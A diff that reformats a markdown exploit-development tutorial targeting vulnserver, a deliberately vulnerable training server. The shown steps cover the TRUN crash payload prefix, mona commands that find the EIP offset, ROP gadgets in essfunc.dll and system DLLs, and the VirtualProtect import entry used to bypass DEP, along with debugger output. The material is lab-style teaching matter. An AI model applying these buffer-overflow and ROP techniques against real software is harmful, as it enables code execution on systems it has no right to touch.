@@ -90,23 +90,23 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
    ```
 
 2. Create a script to send this pattern:
-   ```python
-   pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5..." # Copy from mona output
-   payload = b"TRUN /.:/" + pattern
-   ```
+```python
+pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5..." # Copy from mona output
+payload = b"TRUN /.:/" + pattern
+```
 
 3. After sending the pattern and crashing the server, find our exact offset:
-   ```
-   !py mona findmsp -distance 3000
-   ```
-   
-   Output:
-   ```
-   [+] Examining registers
-    EIP contains normal pattern : 0x396f4338 (offset 2003)
-    ESP (0x00ecf9c8) points at offset 2010 in normal pattern (length 984)
-    EBP contains normal pattern : 0x6f43376f (offset 2001)
-   ```
+```
+!py mona findmsp -distance 3000
+```
+
+Output:
+```
+[+] Examining registers
+ EIP contains normal pattern : 0x396f4338 (offset 2003)
+ ESP (0x00ecf9c8) points at offset 2010 in normal pattern (length 984)
+ EBP contains normal pattern : 0x6f43376f (offset 2001)
+```
 
 We now know our offset to EIP is 2003 bytes.
 
@@ -117,78 +117,79 @@ This is where the real work begins. To build our ROP chain, we need to find smal
 ### 3.1 Finding Base ROP Gadgets
 
 1. First, identify non-ASLR modules:
-   ```
-   !py mona modules
-   ```
-   
-   Output:
-   ```
-   0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False | False |  False   | False  | -1.0- [essfunc.dll] (C:\VulnApps\essfunc.dll) 0x0
-   0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False | False |  False   | False  | -1.0- [vulnserver.exe] (C:\VulnApps\vulnserver.exe) 0x0
-   ```
-   
-   We'll use essfunc.dll since it isn't using ASLR.
+```
+!py mona modules
+```
+
+Output:
+
+```
+0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False | False |  False   | False  | -1.0- [essfunc.dll] (C:\VulnApps\essfunc.dll) 0x0
+0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False | False |  False   | False  | -1.0- [vulnserver.exe] (C:\VulnApps\vulnserver.exe) 0x0
+```
+
+We'll use essfunc.dll since it isn't using ASLR.
 
 2. Find a simple RET instruction (ROP NOP):
-   ```
-   !py mona find -type instr -s "ret" -m essfunc -cpb "\x00"
-   ```
+```
+!py mona find -type instr -s "ret" -m essfunc -cpb "\x00"
+```
+
+Output:
+```
+0x62501022 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
+0x62501057 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
+0x625010b6 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
+0x625011ab : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
+```
    
-   Output:
-   ```
-   0x62501022 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
-   0x62501057 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
-   0x625010b6 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
-   0x625011ab : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
-   ```
-   
-   We'll use 0x62501022 as our ROP NOP.
+We'll use 0x62501022 as our ROP NOP.
+
 
 3. Find a JMP ESP gadget:
-   ```
-   !py mona jmp -r esp -m essfunc -cpb "\x00"
-   ```
+```
+!py mona jmp -r esp -m essfunc -cpb "\x00"
+```
+
+Output:
+```
+0x625011AF : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
+0x625011C7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
+```
    
-   Output:
-   ```
-   0x625011AF : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
-   0x625011C7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
-   ```
-   
-   We'll use 0x625011AF for our JMP ESP gadget.
+We'll use 0x625011AF for our JMP ESP gadget.
 
 ### 3.2 Finding System DLL Gadgets
 
 We also need gadgets from system DLLs to complete our chain:
 
 1. Find PUSHAD instruction:
-   ```
-   !py mona find -type instr -s "pushad # ret" -m "msvcrt,ntdll,kernel32" -cpb "\x00"
-   ```
-   
-   Output:
-   ```
-   0x775d6f67 : pushad | ret [msvcrt.dll]
-   ```
+```
+!py mona find -type instr -s "pushad # ret" -m "msvcrt,ntdll,kernel32" -cpb "\x00"
+```
 
+Output:
+```
+0x775d6f67 : pushad | ret [msvcrt.dll]
+```
 2. Find gadgets for setting other registers:
-   ```
-   !py mona find -type instr -s "xchg eax, edx # ret" -m "ntdll" -cpb "\x00"
-   ```
+```
+!py mona find -type instr -s "xchg eax, edx # ret" -m "ntdll" -cpb "\x00"
+```
+
+Output:
+```
+0x77d9e6c0 : xchg eax, edx | ret | {PAGE_EXECUTE_READ} [ntdll.dll]
+```
    
-   Output:
-   ```
-   0x77d9e6c0 : xchg eax, edx | ret | {PAGE_EXECUTE_READ} [ntdll.dll]
-   ```
+```
+!py mona find -type instr -s "neg eax # ret" -m "kernel32" -cpb "\x00"
+```
    
-   ```
-   !py mona find -type instr -s "neg eax # ret" -m "kernel32" -cpb "\x00"
-   ```
-   
-   Output:
-   ```
-   0x76505808 : neg eax | ret | {PAGE_EXECUTE_READ} [KERNEL32.dll]
-   ```
+Output:
+```
+0x76505808 : neg eax | ret | {PAGE_EXECUTE_READ} [KERNEL32.dll]
+```
 
 ## 4. Finding VirtualProtect in IAT
 
@@ -199,42 +200,40 @@ To bypass DEP, we'll use Windows' VirtualProtect function to change memory permi
    !dh essfunc -f
    ```
    
-   Output:
-   ```
-
-    5000 [     197] address [size] of Export Directory
-    6000 [     224] address [size] of Import Directory
-       0 [       0] address [size] of Resource Directory
-       0 [       0] address [size] of Exception Directory
-       0 [       0] address [size] of Security Directory
-    7000 [      E4] address [size] of Base Relocation Directory
-       0 [       0] address [size] of Debug Directory
-       0 [       0] address [size] of Description Directory
-       0 [       0] address [size] of Special Directory
-       0 [       0] address [size] of Thread Storage Directory
-       0 [       0] address [size] of Load Configuration Directory
-       0 [       0] address [size] of Bound Import Directory
-       0 [       0] address [size] of Import Address Table Directory
-       0 [       0] address [size] of Delay Import Directory
-       0 [       0] address [size] of COR20 Header Directory
-       0 [       0] address [size] of Reserved Directory
-
-   ```
+Output:
+       
+```
+ 5000 [     197] address [size] of Export Directory
+ 6000 [     224] address [size] of Import Directory
+    0 [       0] address [size] of Resource Directory
+    0 [       0] address [size] of Exception Directory
+    0 [       0] address [size] of Security Directory
+ 7000 [      E4] address [size] of Base Relocation Directory
+    0 [       0] address [size] of Debug Directory
+    0 [       0] address [size] of Description Directory
+    0 [       0] address [size] of Special Directory
+    0 [       0] address [size] of Thread Storage Directory
+    0 [       0] address [size] of Load Configuration Directory
+    0 [       0] address [size] of Bound Import Directory
+    0 [       0] address [size] of Import Address Table Directory
+    0 [       0] address [size] of Delay Import Directory
+    0 [       0] address [size] of COR20 Header Directory
+    0 [       0] address [size] of Reserved Directory
+```
 
 2. Dump the IAT and search for VirtualProtect:
-   ```
-   dps essfunc+0x6000 L100
-   ```
+```
+dps essfunc+0x6000 L100
+```
    
    Output:
-   ```
-62506090  764cb3a0 KERNEL32!AddAtomA
-62506094  764cb860 KERNEL32!FindAtomA
-62506098  7650d160 KERNEL32!GetAtomNameA
-6250609c  764d6570 KERNEL32!VirtualProtectStub
-625060a0  764d7b60 KERNEL32!VirtualQueryStub
-
-   ```
+```
+ 62506090  764cb3a0 KERNEL32!AddAtomA
+ 62506094  764cb860 KERNEL32!FindAtomA
+ 62506098  7650d160 KERNEL32!GetAtomNameA
+ 6250609c  764d6570 KERNEL32!VirtualProtectStub
+ 625060a0  764d7b60 KERNEL32!VirtualQueryStub
+```
 
 3. Verify this is the correct function:
    ```
@@ -243,6 +242,7 @@ To bypass DEP, we'll use Windows' VirtualProtect function to change memory permi
    ```
    
    Output:
+       
    ```
 764d6570 8bff            mov     edi,edi
 764d6572 55              push    ebp
